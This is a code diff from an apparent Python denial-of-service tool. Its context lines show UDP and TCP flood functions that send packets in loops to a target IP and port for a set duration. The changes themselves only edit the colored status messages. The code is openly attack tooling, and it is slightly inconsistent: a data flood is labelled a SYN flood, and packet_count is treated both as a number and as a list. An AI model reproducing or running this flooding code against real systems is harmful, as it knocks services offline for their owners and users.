@@ -39,7 +39,7 @@ def udp_plain_flood(ip, port, duration, packet_size):
         while time.time() < end_time:
             time.sleep(0.2)
             print("\033[48;5;4mStarting UDP Plain flood on \033[0m \033[33m" +str(ip)+ " \033[32m0k..!\033[0m")
-            print("\033[94m Starting UDP Plain flood on \033[97m" +str(packet_size)+ " \033[38;5;5mm0k...!\033[0m")
+            print("\033[94m Starting UDP Plain flood on \033[97m" +str(packet_count)+ " \033[38;5;5mInfo-running\033[0m")
             sock.sendto(payload, (ip, port))
             packet_count += 1
     except Exception as e:
@@ -58,7 +58,7 @@ def udp_random_flood(ip, port, duration, packet_size):
         while time.time() < end_time:
             time.sleep(0.2)
             print("\033[48;5;3mStarting UDP Random flood on \033[0m \033[32m" +str(ip)+ " \033[33m0k..!\033[0m")
-            print("\033[33m Starting UDP Random flood on \033[97m" +str(packet_size)+ " \033[38;5;5mm0k...!\033[0m")
+            print("\033[33m Starting UDP Random flood on \033[97m" +str(packet_count)+ " \033[38;5;5mInfo-running\033[0m")
             payload = random.randbytes(packet_size)  # Random payload
             sock.sendto(payload, (ip, port))
             packet_count += 1
@@ -142,8 +142,8 @@ def tcp_data_flood_multi(ip, port, duration, packet_size):
         try:
             sock.connect((ip, port))
             while time.time() < end_time:
-                print("\033[48;5;1mStarting TCP SYN flood 0ne-Threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!")
-                print("\033[91m Starting TCP SYN flood 0ne-Threads \033[32m" +str(packet_count)+ " \033[94m0k...!\033[0m")
+                print("\033[48;5;1mStarting TCP SYN flood Multi-threads \033[0m \033[97m" +str(ip)+ " \033[33m0k..!")
+                print("\033[91m Starting TCP SYN flood Multi-threads \033[32m" +str(packet_count)+ " \033[94mnumb-attack\033[0m")
                 sock.send(payload)
                 packet_count[0] += 1
         except:
